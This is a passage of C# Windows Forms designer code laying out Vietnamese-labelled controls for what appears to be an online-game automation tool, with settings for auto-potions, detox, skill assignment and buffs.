		this.textBoxRatioMau2.ForeColor = System.Drawing.Color.Black;
		this.textBoxRatioMau2.Location = new System.Drawing.Point(126, 78);
		this.textBoxRatioMau2.Name = "textBoxRatioMau2";
		this.textBoxRatioMau2.Size = new System.Drawing.Size(38, 21);
		this.textBoxRatioMau2.TabIndex = 315;
		this.textBoxRatioMau2.TextChanged += new System.EventHandler(textBoxRatioMau2_TextChanged);
		this.checkBoxMPTdp.AutoSize = true;
		this.checkBoxMPTdp.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxMPTdp.ForeColor = System.Drawing.Color.Red;
		this.checkBoxMPTdp.Location = new System.Drawing.Point(241, 132);
		this.checkBoxMPTdp.Name = "checkBoxMPTdp";
		this.checkBoxMPTdp.Size = new System.Drawing.Size(115, 17);
		this.checkBoxMPTdp.TabIndex = 129;
		this.checkBoxMPTdp.Text = "TĐP (%) mana còn";
		this.checkBoxMPTdp.UseVisualStyleBackColor = true;
		this.checkBoxMPTdp.CheckedChanged += new System.EventHandler(checkBoxMPTdp_CheckedChanged);
		this.textBoxTDP_SL_Mana.ForeColor = System.Drawing.Color.Black;
		this.textBoxTDP_SL_Mana.Location = new System.Drawing.Point(356, 103);
		this.textBoxTDP_SL_Mana.Name = "textBoxTDP_SL_Mana";
		this.textBoxTDP_SL_Mana.Size = new System.Drawing.Size(30, 21);
		this.textBoxTDP_SL_Mana.TabIndex = 313;
		this.textBoxTDP_SL_Mana.TextChanged += new System.EventHandler(textBoxTDP_SL_Mana_TextChanged);
		this.textBoxSoluongBomMagic.BackColor = System.Drawing.SystemColors.Info;
		this.textBoxSoluongBomMagic.ForeColor = System.Drawing.Color.Black;
		this.textBoxSoluongBomMagic.Location = new System.Drawing.Point(207, 176);
		this.textBoxSoluongBomMagic.Name = "textBoxSoluongBomMagic";
		this.textBoxSoluongBomMagic.Size = new System.Drawing.Size(30, 21);
		this.textBoxSoluongBomMagic.TabIndex = 202;
		this.textBoxSoluongBomMagic.TextChanged += new System.EventHandler(textBoxSoluongBomMagic_TextChanged);
		this.textBoxTimerBomMagic.BackColor = System.Drawing.SystemColors.Info;
		this.textBoxTimerBomMagic.ForeColor = System.Drawing.Color.Black;
		this.textBoxTimerBomMagic.Location = new System.Drawing.Point(166, 176);
		this.textBoxTimerBomMagic.Name = "textBoxTimerBomMagic";
		this.textBoxTimerBomMagic.Size = new System.Drawing.Size(38, 21);
		this.textBoxTimerBomMagic.TabIndex = 200;
		this.textBoxTimerBomMagic.TextChanged += new System.EventHandler(textBoxTimerBomMagic_TextChanged);
		this.checkBoxTuGiaidoc.AutoSize = true;
		this.checkBoxTuGiaidoc.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTuGiaidoc.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.checkBoxTuGiaidoc.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTuGiaidoc.Location = new System.Drawing.Point(3, 178);
		this.checkBoxTuGiaidoc.Name = "checkBoxTuGiaidoc";
		this.checkBoxTuGiaidoc.Size = new System.Drawing.Size(163, 17);
		this.checkBoxTuGiaidoc.TabIndex = 199;
		this.checkBoxTuGiaidoc.Text = "Tự ăn giải độc (ms, số lượng)";
		this.checkBoxTuGiaidoc.UseVisualStyleBackColor = false;
		this.checkBoxTuGiaidoc.CheckedChanged += new System.EventHandler(checkBoxTuGiaidoc_CheckedChanged);
		this.textBoxTDP_SL_Mau.ForeColor = System.Drawing.Color.Black;
		this.textBoxTDP_SL_Mau.Location = new System.Drawing.Point(356, 13);
		this.textBoxTDP_SL_Mau.Name = "textBoxTDP_SL_Mau";
		this.textBoxTDP_SL_Mau.Size = new System.Drawing.Size(30, 21);
		this.textBoxTDP_SL_Mau.TabIndex = 311;
		this.textBoxTDP_SL_Mau.TextChanged += new System.EventHandler(textBoxTDP_SL_Mau_TextChanged);
		this.buttonGiaiThichHaucan.BackColor = System.Drawing.SystemColors.Control;
		this.buttonGiaiThichHaucan.ForeColor = System.Drawing.Color.MediumBlue;
		this.buttonGiaiThichHaucan.Location = new System.Drawing.Point(241, 218);
		this.buttonGiaiThichHaucan.Name = "buttonGiaiThichHaucan";
		this.buttonGiaiThichHaucan.Size = new System.Drawing.Size(146, 41);
		this.buttonGiaiThichHaucan.TabIndex = 203;
		this.buttonGiaiThichHaucan.Text = "Bảng hướng dẫn cụ thể, đọc chi tiết";
		this.buttonGiaiThichHaucan.UseVisualStyleBackColor = false;
		this.buttonGiaiThichHaucan.Click += new System.EventHandler(buttonGiaiThichHaucan_Click);
		this.checkBoxTDP_SL_Mana.ForeColor = System.Drawing.Color.Blue;
		this.checkBoxTDP_SL_Mana.Location = new System.Drawing.Point(241, 91);
		this.checkBoxTDP_SL_Mana.Name = "checkBoxTDP_SL_Mana";
		this.checkBoxTDP_SL_Mana.Size = new System.Drawing.Size(119, 43);
		this.checkBoxTDP_SL_Mana.TabIndex = 314;
		this.checkBoxTDP_SL_Mana.Text = "TĐP số lượng mana còn (bình)";
		this.checkBoxTDP_SL_Mana.UseVisualStyleBackColor = true;
		this.checkBoxTDP_SL_Mana.CheckedChanged += new System.EventHandler(checkBoxTDP_SL_Mana_CheckedChanged);
		this.checkBoxTDP_SL_Mau.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.checkBoxTDP_SL_Mau.ForeColor = System.Drawing.Color.Blue;
		this.checkBoxTDP_SL_Mau.Location = new System.Drawing.Point(240, 3);
		this.checkBoxTDP_SL_Mau.Name = "checkBoxTDP_SL_Mau";
		this.checkBoxTDP_SL_Mau.Size = new System.Drawing.Size(110, 40);
		this.checkBoxTDP_SL_Mau.TabIndex = 312;
		this.checkBoxTDP_SL_Mau.Text = "TĐP khi số lượng máu còn (bình)";
		this.checkBoxTDP_SL_Mau.UseVisualStyleBackColor = true;
		this.checkBoxTDP_SL_Mau.CheckedChanged += new System.EventHandler(checkBoxTDP_SL_Mau_CheckedChanged);
		this.checkBoxMPBom.AutoSize = true;
		this.checkBoxMPBom.ForeColor = System.Drawing.Color.Red;
		this.checkBoxMPBom.Location = new System.Drawing.Point(3, 128);
		this.checkBoxMPBom.Name = "checkBoxMPBom";
		this.checkBoxMPBom.Size = new System.Drawing.Size(123, 19);
		this.checkBoxMPBom.TabIndex = 131;
		this.checkBoxMPBom.Text = "Bơm mana (%)=>";
		this.checkBoxMPBom.UseVisualStyleBackColor = true;
		this.checkBoxMPBom.CheckedChanged += new System.EventHandler(checkBoxMPBom_CheckedChanged);
		this.textBoxThoiGianBomHPDiem.ForeColor = System.Drawing.Color.MidnightBlue;
		this.textBoxThoiGianBomHPDiem.Location = new System.Drawing.Point(165, 15);
		this.textBoxThoiGianBomHPDiem.Name = "textBoxThoiGianBomHPDiem";
		this.textBoxThoiGianBomHPDiem.Size = new System.Drawing.Size(38, 21);
		this.textBoxThoiGianBomHPDiem.TabIndex = 154;
		this.textBoxThoiGianBomHPDiem.TextChanged += new System.EventHandler(textBoxThoiGianBomHPDiem_TextChanged);
		this.textBoxSoluongBomHP.BackColor = System.Drawing.SystemColors.Info;
		this.textBoxSoluongBomHP.ForeColor = System.Drawing.Color.Black;
		this.textBoxSoluongBomHP.Location = new System.Drawing.Point(206, 37);
		this.textBoxSoluongBomHP.Name = "textBoxSoluongBomHP";
		this.textBoxSoluongBomHP.Size = new System.Drawing.Size(30, 21);
		this.textBoxSoluongBomHP.TabIndex = 144;
		this.textBoxSoluongBomHP.TextChanged += new System.EventHandler(textBoxSoluongBomHP_TextChanged);
		this.checkBoxHPTdp.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxHPTdp.ForeColor = System.Drawing.Color.Red;
		this.checkBoxHPTdp.Location = new System.Drawing.Point(241, 41);
		this.checkBoxHPTdp.Name = "checkBoxHPTdp";
		this.checkBoxHPTdp.Size = new System.Drawing.Size(124, 21);
		this.checkBoxHPTdp.TabIndex = 125;
		this.checkBoxHPTdp.Text = "TĐP (%) máu còn";
		this.checkBoxHPTdp.UseVisualStyleBackColor = true;
		this.checkBoxHPTdp.CheckedChanged += new System.EventHandler(checkBoxHPTdp_CheckedChanged);
		this.textBoxThoigianBomMP.ForeColor = System.Drawing.Color.Black;
		this.textBoxThoigianBomMP.Location = new System.Drawing.Point(166, 126);
		this.textBoxThoigianBomMP.Name = "textBoxThoigianBomMP";
		this.textBoxThoigianBomMP.Size = new System.Drawing.Size(38, 21);
		this.textBoxThoigianBomMP.TabIndex = 143;
		this.textBoxThoigianBomMP.TextChanged += new System.EventHandler(textBoxThoigianBomMP_TextChanged);
		this.textBoxThoigianBomHP.BackColor = System.Drawing.SystemColors.Info;
		this.textBoxThoigianBomHP.ForeColor = System.Drawing.Color.Black;
		this.textBoxThoigianBomHP.Location = new System.Drawing.Point(165, 37);
		this.textBoxThoigianBomHP.Name = "textBoxThoigianBomHP";
		this.textBoxThoigianBomHP.Size = new System.Drawing.Size(38, 21);
		this.textBoxThoigianBomHP.TabIndex = 142;
		this.textBoxThoigianBomHP.TextChanged += new System.EventHandler(textBoxThoigianBomHP_TextChanged);
		this.textBoxBomHPDiem.ForeColor = System.Drawing.Color.MidnightBlue;
		this.textBoxBomHPDiem.Location = new System.Drawing.Point(125, 15);
		this.textBoxBomHPDiem.Name = "textBoxBomHPDiem";
		this.textBoxBomHPDiem.Size = new System.Drawing.Size(38, 21);
		this.textBoxBomHPDiem.TabIndex = 150;
		this.textBoxBomHPDiem.TextChanged += new System.EventHandler(textBoxBomHPDiem_TextChanged);
		this.checkBoxBomHPDiem.AutoSize = true;
		this.checkBoxBomHPDiem.ForeColor = System.Drawing.Color.Blue;
		this.checkBoxBomHPDiem.Location = new System.Drawing.Point(3, 15);
		this.checkBoxBomHPDiem.Name = "checkBoxBomHPDiem";
		this.checkBoxBomHPDiem.Size = new System.Drawing.Size(111, 19);
		this.checkBoxBomHPDiem.TabIndex = 151;
		this.checkBoxBomHPDiem.Text = "Bơm máu điểm";
		this.checkBoxBomHPDiem.UseVisualStyleBackColor = true;
		this.checkBoxBomHPDiem.CheckedChanged += new System.EventHandler(checkBoxBomHPDiem_CheckedChanged);
		this.textBoxSoLuongBomHPDiem.ForeColor = System.Drawing.Color.MidnightBlue;
		this.textBoxSoLuongBomHPDiem.Location = new System.Drawing.Point(206, 15);
		this.textBoxSoLuongBomHPDiem.Name = "textBoxSoLuongBomHPDiem";
		this.textBoxSoLuongBomHPDiem.Size = new System.Drawing.Size(30, 21);
		this.textBoxSoLuongBomHPDiem.TabIndex = 156;
		this.textBoxSoLuongBomHPDiem.TextChanged += new System.EventHandler(textBoxSoLuongBomHPDiem_TextChanged);
		this.checkBoxBomHP.AutoSize = true;
		this.checkBoxBomHP.ForeColor = System.Drawing.Color.Red;
		this.checkBoxBomHP.Location = new System.Drawing.Point(3, 38);
		this.checkBoxBomHP.Name = "checkBoxBomHP";
		this.checkBoxBomHP.Size = new System.Drawing.Size(122, 19);
		this.checkBoxBomHP.TabIndex = 127;
		this.checkBoxBomHP.Text = "Bơm máu  (%) =>";
		this.checkBoxBomHP.UseVisualStyleBackColor = true;
		this.checkBoxBomHP.CheckedChanged += new System.EventHandler(checkBoxBomHP_CheckedChanged);
		this.textBoxMPBom.ForeColor = System.Drawing.Color.Black;
		this.textBoxMPBom.Location = new System.Drawing.Point(127, 126);
		this.textBoxMPBom.Name = "textBoxMPBom";
		this.textBoxMPBom.Size = new System.Drawing.Size(38, 21);
		this.textBoxMPBom.TabIndex = 130;
		this.textBoxMPBom.TextChanged += new System.EventHandler(textBoxMPBom_TextChanged);
		this.textBoxBomMPDiem.ForeColor = System.Drawing.Color.MidnightBlue;
		this.textBoxBomMPDiem.Location = new System.Drawing.Point(127, 102);
		this.textBoxBomMPDiem.Name = "textBoxBomMPDiem";
		this.textBoxBomMPDiem.Size = new System.Drawing.Size(38, 21);
		this.textBoxBomMPDiem.TabIndex = 152;
		this.textBoxBomMPDiem.TextChanged += new System.EventHandler(textBoxBomMPDiem_TextChanged);
		this.textBoxSoLuongBomMPDiem.ForeColor = System.Drawing.Color.MidnightBlue;
		this.textBoxSoLuongBomMPDiem.Location = new System.Drawing.Point(207, 102);
		this.textBoxSoLuongBomMPDiem.Name = "textBoxSoLuongBomMPDiem";
		this.textBoxSoLuongBomMPDiem.Size = new System.Drawing.Size(30, 21);
		this.textBoxSoLuongBomMPDiem.TabIndex = 157;
		this.textBoxSoLuongBomMPDiem.TextChanged += new System.EventHandler(textBoxSoLuongBomMPDiem_TextChanged);
		this.checkBoxBomMPDiem.AutoSize = true;
		this.checkBoxBomMPDiem.ForeColor = System.Drawing.Color.Blue;
		this.checkBoxBomMPDiem.Location = new System.Drawing.Point(3, 104);
		this.checkBoxBomMPDiem.Name = "checkBoxBomMPDiem";
		this.checkBoxBomMPDiem.Size = new System.Drawing.Size(118, 19);
		this.checkBoxBomMPDiem.TabIndex = 153;
		this.checkBoxBomMPDiem.Text = "Bơm mana điểm";
		this.checkBoxBomMPDiem.UseVisualStyleBackColor = true;
		this.checkBoxBomMPDiem.CheckedChanged += new System.EventHandler(checkBoxBomMPDiem_CheckedChanged);
		this.textBoxThoiGianBomMPDiem.ForeColor = System.Drawing.Color.MidnightBlue;
		this.textBoxThoiGianBomMPDiem.Location = new System.Drawing.Point(166, 102);
		this.textBoxThoiGianBomMPDiem.Name = "textBoxThoiGianBomMPDiem";
		this.textBoxThoiGianBomMPDiem.Size = new System.Drawing.Size(38, 21);
		this.textBoxThoiGianBomMPDiem.TabIndex = 155;
		this.textBoxThoiGianBomMPDiem.TextChanged += new System.EventHandler(textBoxThoiGianBomMPDiem_TextChanged);
		this.textBoxHPBom.BackColor = System.Drawing.SystemColors.Info;
		this.textBoxHPBom.ForeColor = System.Drawing.Color.Black;
		this.textBoxHPBom.Location = new System.Drawing.Point(125, 37);
		this.textBoxHPBom.Name = "textBoxHPBom";
		this.textBoxHPBom.Size = new System.Drawing.Size(38, 21);
		this.textBoxHPBom.TabIndex = 126;
		this.textBoxHPBom.TextChanged += new System.EventHandler(textBoxHPBom_TextChanged);
		this.textBoxSoluongBomMP.ForeColor = System.Drawing.Color.Black;
		this.textBoxSoluongBomMP.Location = new System.Drawing.Point(207, 126);
		this.textBoxSoluongBomMP.Name = "textBoxSoluongBomMP";
		this.textBoxSoluongBomMP.Size = new System.Drawing.Size(30, 21);
		this.textBoxSoluongBomMP.TabIndex = 145;
		this.textBoxSoluongBomMP.TextChanged += new System.EventHandler(textBoxSoluongBomMP_TextChanged);
		this.tabPageChieuthuc.Controls.Add(this.groupBox5);
		this.tabPageChieuthuc.Controls.Add(this.comboBoxGanChieuPhai);
		this.tabPageChieuthuc.Controls.Add(this.comboBoxGanChieuTrai);
		this.tabPageChieuthuc.Controls.Add(this.buttonSkill120tn);
		this.tabPageChieuthuc.Controls.Add(this.checkBoxGanChieuTrai);
		this.tabPageChieuthuc.Controls.Add(this.buttonSkill120vd);
		this.tabPageChieuthuc.Controls.Add(this.checkBoxGanChieuPhai);
		this.tabPageChieuthuc.Controls.Add(this.groupBox1);
		this.tabPageChieuthuc.Controls.Add(this.tabControlChuyenSkill);
		this.tabPageChieuthuc.Controls.Add(this.checkBoxTuGiaiBua);
		this.tabPageChieuthuc.Controls.Add(this.checkBoxTNXuatChieu120);
		this.tabPageChieuthuc.Location = new System.Drawing.Point(4, 24);
		this.tabPageChieuthuc.Name = "tabPageChieuthuc";
		this.tabPageChieuthuc.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageChieuthuc.Size = new System.Drawing.Size(390, 266);
		this.tabPageChieuthuc.TabIndex = 3;
		this.tabPageChieuthuc.Text = "Chiêu thức";
		this.tabPageChieuthuc.UseVisualStyleBackColor = true;
		this.groupBox5.Controls.Add(this.checkBoxConLon);
		this.groupBox5.Controls.Add(this.checkBoxTTDT);
		this.groupBox5.Location = new System.Drawing.Point(250, 6);
		this.groupBox5.Name = "groupBox5";
		this.groupBox5.Size = new System.Drawing.Size(145, 63);
		this.groupBox5.TabIndex = 331;
		this.groupBox5.TabStop = false;
		this.groupBox5.Text = "CL buff cho ac chính";
		this.checkBoxConLon.AutoSize = true;
		this.checkBoxConLon.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxConLon.ForeColor = System.Drawing.Color.Black;
		this.checkBoxConLon.Location = new System.Drawing.Point(5, 18);
		this.checkBoxConLon.Name = "checkBoxConLon";
		this.checkBoxConLon.Size = new System.Drawing.Size(125, 19);
		this.checkBoxConLon.TabIndex = 328;
		this.checkBoxConLon.Text = "Thanh Phong Phù";
		this.checkBoxConLon.UseVisualStyleBackColor = false;
		this.checkBoxConLon.CheckedChanged += new System.EventHandler(checkBoxConLon_CheckedChanged);
		this.checkBoxTTDT.AutoSize = true;
		this.checkBoxTTDT.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTTDT.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.checkBoxTTDT.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTTDT.Location = new System.Drawing.Point(5, 41);
		this.checkBoxTTDT.Name = "checkBoxTTDT";
		this.checkBoxTTDT.Size = new System.Drawing.Size(131, 17);
		this.checkBoxTTDT.TabIndex = 330;
		this.checkBoxTTDT.Text = "Thanh Thiên Địa Trọc";
		this.checkBoxTTDT.UseVisualStyleBackColor = false;
		this.checkBoxTTDT.CheckedChanged += new System.EventHandler(checkBoxTTDT_CheckedChanged);
		this.comboBoxGanChieuPhai.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxGanChieuPhai.DropDownWidth = 140;
		this.comboBoxGanChieuPhai.ForeColor = System.Drawing.Color.Black;
		this.comboBoxGanChieuPhai.FormattingEnabled = true;
		this.comboBoxGanChieuPhai.Location = new System.Drawing.Point(278, 147);
		this.comboBoxGanChieuPhai.Name = "comboBoxGanChieuPhai";
		this.comboBoxGanChieuPhai.Size = new System.Drawing.Size(107, 23);
		this.comboBoxGanChieuPhai.TabIndex = 198;
		this.comboBoxGanChieuPhai.SelectedIndexChanged += new System.EventHandler(comboBoxGanChieuPhai_SelectedIndexChanged);
		this.comboBoxGanChieuTrai.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxGanChieuTrai.DropDownWidth = 140;
		this.comboBoxGanChieuTrai.ForeColor = System.Drawing.Color.Black;
		this.comboBoxGanChieuTrai.FormattingEnabled = true;
		this.comboBoxGanChieuTrai.Location = new System.Drawing.Point(278, 193);
		this.comboBoxGanChieuTrai.Name = "comboBoxGanChieuTrai";
		this.comboBoxGanChieuTrai.Size = new System.Drawing.Size(108, 23);
		this.comboBoxGanChieuTrai.TabIndex = 197;
		this.comboBoxGanChieuTrai.SelectedIndexChanged += new System.EventHandler(comboBoxGanChieuTrai_SelectedIndexChanged);
		this.buttonSkill120tn.BackColor = System.Drawing.SystemColors.Control;
		this.buttonSkill120tn.ForeColor = System.Drawing.Color.Black;
		this.buttonSkill120tn.Location = new System.Drawing.Point(278, 102);
		this.buttonSkill120tn.Name = "buttonSkill120tn";
		this.buttonSkill120tn.Size = new System.Drawing.Size(108, 21);
		this.buttonSkill120tn.TabIndex = 323;
		this.buttonSkill120tn.Text = "Thiên Nhẫn 120";
		this.buttonSkill120tn.UseVisualStyleBackColor = false;
		this.buttonSkill120tn.Click += new System.EventHandler(buttonSkill120tn_Click);
		this.checkBoxGanChieuTrai.AutoSize = true;
		this.checkBoxGanChieuTrai.ForeColor = System.Drawing.Color.Black;
		this.checkBoxGanChieuTrai.Location = new System.Drawing.Point(256, 174);
		this.checkBoxGanChieuTrai.Name = "checkBoxGanChieuTrai";
		this.checkBoxGanChieuTrai.Size = new System.Drawing.Size(120, 19);
		this.checkBoxGanChieuTrai.TabIndex = 155;
		this.checkBoxGanChieuTrai.Text = "Gán chiêu tay trái";
		this.checkBoxGanChieuTrai.UseVisualStyleBackColor = true;
		this.checkBoxGanChieuTrai.CheckedChanged += new System.EventHandler(checkBoxGanChieuTrai_CheckedChanged);
		this.buttonSkill120vd.BackColor = System.Drawing.SystemColors.Control;
		this.buttonSkill120vd.ForeColor = System.Drawing.Color.Black;
		this.buttonSkill120vd.Location = new System.Drawing.Point(278, 73);
		this.buttonSkill120vd.Name = "buttonSkill120vd";
		this.buttonSkill120vd.Size = new System.Drawing.Size(108, 21);
		this.buttonSkill120vd.TabIndex = 324;
		this.buttonSkill120vd.Text = "Võ đang skil 120";
		this.buttonSkill120vd.UseVisualStyleBackColor = false;
		this.buttonSkill120vd.Click += new System.EventHandler(buttonSkill120vd_Click);
		this.checkBoxGanChieuPhai.AutoSize = true;
		this.checkBoxGanChieuPhai.ForeColor = System.Drawing.Color.Black;
		this.checkBoxGanChieuPhai.Location = new System.Drawing.Point(255, 128);
		this.checkBoxGanChieuPhai.Name = "checkBoxGanChieuPhai";
		this.checkBoxGanChieuPhai.Size = new System.Drawing.Size(127, 19);
		this.checkBoxGanChieuPhai.TabIndex = 156;
		this.checkBoxGanChieuPhai.Text = "Gán chiêu tay phải";
		this.checkBoxGanChieuPhai.UseVisualStyleBackColor = true;
		this.checkBoxGanChieuPhai.CheckedChanged += new System.EventHandler(checkBoxGanChieuPhai_CheckedChanged);
		this.groupBox1.Controls.Add(this.checkBoxTatBuffTamthoi);
		this.groupBox1.Controls.Add(this.comboBoxTranphai1);
		this.groupBox1.Controls.Add(this.comboBoxTranphai2);
		this.groupBox1.Controls.Add(this.textBoxTranphai2);
		this.groupBox1.Controls.Add(this.textBoxTranphai1);
		this.groupBox1.Controls.Add(this.checkBoxTranphai1);
		this.groupBox1.Controls.Add(this.checkBoxTranphai3);
		this.groupBox1.Controls.Add(this.comboBoxTranphai3);
		this.groupBox1.Controls.Add(this.checkBoxTranphai2);
		this.groupBox1.Controls.Add(this.textBoxTranphai3);
		this.groupBox1.ForeColor = System.Drawing.Color.DarkBlue;
		this.groupBox1.Location = new System.Drawing.Point(1, 3);
		this.groupBox1.Name = "groupBox1";
		this.groupBox1.Size = new System.Drawing.Size(249, 118);
		this.groupBox1.TabIndex = 327;
		this.groupBox1.TabStop = false;
		this.groupBox1.Text = "Buff trấn phái và hỗ trợ";
		this.checkBoxTatBuffTamthoi.AutoSize = true;
		this.checkBoxTatBuffTamthoi.ForeColor = System.Drawing.Color.Red;
		this.checkBoxTatBuffTamthoi.Location = new System.Drawing.Point(48, 94);
		this.checkBoxTatBuffTamthoi.Name = "checkBoxTatBuffTamthoi";
		this.checkBoxTatBuffTamthoi.Size = new System.Drawing.Size(193, 19);
		this.checkBoxTatBuffTamthoi.TabIndex = 358;
		this.checkBoxTatBuffTamthoi.Text = "Tạm thời tắt buff ở tất cả các ac";
		this.checkBoxTatBuffTamthoi.UseVisualStyleBackColor = true;
		this.checkBoxTatBuffTamthoi.CheckedChanged += new System.EventHandler(checkBoxTatBuffTamthoi_CheckedChanged);
		this.comboBoxTranphai1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxTranphai1.ForeColor = System.Drawing.Color.Black;
		this.comboBoxTranphai1.FormattingEnabled = true;
		this.comboBoxTranphai1.Location = new System.Drawing.Point(40, 21);
		this.comboBoxTranphai1.Name = "comboBoxTranphai1";
		this.comboBoxTranphai1.Size = new System.Drawing.Size(158, 23);
		this.comboBoxTranphai1.TabIndex = 349;
		this.comboBoxTranphai1.SelectedIndexChanged += new System.EventHandler(comboBoxTranphai1_SelectedIndexChanged);
		this.comboBoxTranphai2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxTranphai2.ForeColor = System.Drawing.Color.Black;
		this.comboBoxTranphai2.FormattingEnabled = true;
		this.comboBoxTranphai2.Location = new System.Drawing.Point(40, 45);
		this.comboBoxTranphai2.Name = "comboBoxTranphai2";
		this.comboBoxTranphai2.Size = new System.Drawing.Size(158, 23);
		this.comboBoxTranphai2.TabIndex = 351;
		this.comboBoxTranphai2.SelectedIndexChanged += new System.EventHandler(comboBoxTranphai2_SelectedIndexChanged);
		this.textBoxTranphai2.ForeColor = System.Drawing.Color.Black;
		this.textBoxTranphai2.Location = new System.Drawing.Point(200, 46);
		this.textBoxTranphai2.Name = "textBoxTranphai2";
		this.textBoxTranphai2.Size = new System.Drawing.Size(45, 21);
		this.textBoxTranphai2.TabIndex = 352;
		this.textBoxTranphai2.Text = "0";
		this.textBoxTranphai2.TextChanged += new System.EventHandler(textBoxTranphai2_TextChanged);
		this.textBoxTranphai1.ForeColor = System.Drawing.Color.Black;
		this.textBoxTranphai1.Location = new System.Drawing.Point(200, 22);
		this.textBoxTranphai1.Name = "textBoxTranphai1";
		this.textBoxTranphai1.Size = new System.Drawing.Size(45, 21);
		this.textBoxTranphai1.TabIndex = 350;
		this.textBoxTranphai1.Text = "0";
		this.textBoxTranphai1.TextChanged += new System.EventHandler(textBoxTranphai1_TextChanged);
		this.checkBoxTranphai1.AutoSize = true;
		this.checkBoxTranphai1.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTranphai1.Location = new System.Drawing.Point(7, 22);
		this.checkBoxTranphai1.Name = "checkBoxTranphai1";
		this.checkBoxTranphai1.Size = new System.Drawing.Size(33, 19);
		this.checkBoxTranphai1.TabIndex = 355;
		this.checkBoxTranphai1.Text = "1";
		this.checkBoxTranphai1.UseVisualStyleBackColor = true;
		this.checkBoxTranphai1.CheckedChanged += new System.EventHandler(checkBoxTranphai1_CheckedChanged);
		this.checkBoxTranphai3.AutoSize = true;
		this.checkBoxTranphai3.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTranphai3.Location = new System.Drawing.Point(7, 72);
		this.checkBoxTranphai3.Name = "checkBoxTranphai3";
		this.checkBoxTranphai3.Size = new System.Drawing.Size(33, 19);
		this.checkBoxTranphai3.TabIndex = 357;
		this.checkBoxTranphai3.Text = "3";
		this.checkBoxTranphai3.UseVisualStyleBackColor = true;
		this.checkBoxTranphai3.CheckedChanged += new System.EventHandler(checkBoxTranphai3_CheckedChanged);
		this.comboBoxTranphai3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxTranphai3.ForeColor = System.Drawing.Color.Black;
		this.comboBoxTranphai3.FormattingEnabled = true;
		this.comboBoxTranphai3.Location = new System.Drawing.Point(40, 69);
		this.comboBoxTranphai3.Name = "comboBoxTranphai3";
		this.comboBoxTranphai3.Size = new System.Drawing.Size(158, 23);
		this.comboBoxTranphai3.TabIndex = 353;
		this.comboBoxTranphai3.SelectedIndexChanged += new System.EventHandler(comboBoxTranphai3_SelectedIndexChanged);
		this.checkBoxTranphai2.AutoSize = true;
		this.checkBoxTranphai2.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTranphai2.Location = new System.Drawing.Point(7, 47);
		this.checkBoxTranphai2.Name = "checkBoxTranphai2";
		this.checkBoxTranphai2.Size = new System.Drawing.Size(33, 19);
		this.checkBoxTranphai2.TabIndex = 356;
		this.checkBoxTranphai2.Text = "2";
		this.checkBoxTranphai2.UseVisualStyleBackColor = true;
		this.checkBoxTranphai2.CheckedChanged += new System.EventHandler(checkBoxTranphai2_CheckedChanged);
		this.textBoxTranphai3.ForeColor = System.Drawing.Color.Black;
		this.textBoxTranphai3.Location = new System.Drawing.Point(200, 70);
		this.textBoxTranphai3.Name = "textBoxTranphai3";
		this.textBoxTranphai3.Size = new System.Drawing.Size(45, 21);
		this.textBoxTranphai3.TabIndex = 354;
		this.textBoxTranphai3.Text = "0";
		this.textBoxTranphai3.TextChanged += new System.EventHandler(textBoxTranphai3_TextChanged);
		this.tabControlChuyenSkill.Controls.Add(this.tabPage19);
		this.tabControlChuyenSkill.Controls.Add(this.tabPage20);
		this.tabControlChuyenSkill.Controls.Add(this.tabPage22);
		this.tabControlChuyenSkill.Location = new System.Drawing.Point(-1, 120);
		this.tabControlChuyenSkill.Name = "tabControlChuyenSkill";
		this.tabControlChuyenSkill.SelectedIndex = 0;
		this.tabControlChuyenSkill.Size = new System.Drawing.Size(249, 150);
		this.tabControlChuyenSkill.TabIndex = 326;
		this.tabPage19.Controls.Add(this.comboBoxKieu3);
		this.tabPage19.Controls.Add(this.comboBoxKieu2);
		this.tabPage19.Controls.Add(this.comboBoxKieu1);
		this.tabPage19.Controls.Add(this.textBoxChuyenTrai3);
		this.tabPage19.Controls.Add(this.comboBoxChuyenTrai1);
		this.tabPage19.Controls.Add(this.checkBoxChuyenTrai1);
		this.tabPage19.Controls.Add(this.comboBoxChuyenTrai2);
		this.tabPage19.Controls.Add(this.comboBoxChuyenTrai3);
		this.tabPage19.Controls.Add(this.checkBoxChuyenTrai3);
		this.tabPage19.Controls.Add(this.textBoxChuyenTrai1);
		this.tabPage19.Controls.Add(this.checkBoxChuyenTrai2);
		this.tabPage19.Controls.Add(this.textBoxChuyenTrai2);
		this.tabPage19.Location = new System.Drawing.Point(4, 24);
		this.tabPage19.Name = "tabPage19";
		this.tabPage19.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage19.Size = new System.Drawing.Size(241, 122);
		this.tabPage19.TabIndex = 0;
		this.tabPage19.Text = "Chuyển chiêu trái";
		this.tabPage19.UseVisualStyleBackColor = true;
		this.comboBoxKieu3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxKieu3.DropDownWidth = 80;
		this.comboBoxKieu3.FormattingEnabled = true;
		this.comboBoxKieu3.Location = new System.Drawing.Point(140, 98);
		this.comboBoxKieu3.Name = "comboBoxKieu3";
		this.comboBoxKieu3.Size = new System.Drawing.Size(55, 23);
		this.comboBoxKieu3.TabIndex = 36;
		this.comboBoxKieu3.SelectedIndexChanged += new System.EventHandler(comboBoxKieu3_SelectedIndexChanged);
